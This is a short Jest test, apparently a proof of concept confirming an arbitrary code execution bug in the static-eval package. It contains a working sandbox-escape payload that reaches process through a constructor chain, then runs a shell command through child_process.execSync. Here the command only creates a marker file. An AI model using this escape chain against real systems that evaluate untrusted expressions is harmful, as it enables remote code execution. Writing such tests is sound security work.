test("Arbitrary code execution in static-eval", () => {
  const fs = require("fs");
  const path = "./stat-eval";
  expect.assertions(2);
  const evaluate = require("static-eval");
  const parse = require("esprima").parse;
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let src = "(function(){1 + (  console.log(this.constructor.constructor(`return process`)().mainModule.require(`child_process`).execSync(`touch stat-eval`).toString())  )}())";

  try {
    let ast = parse(src).body[0].expression;
    let res = evaluate(ast, {});
  } catch (error) {console.log(error)}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
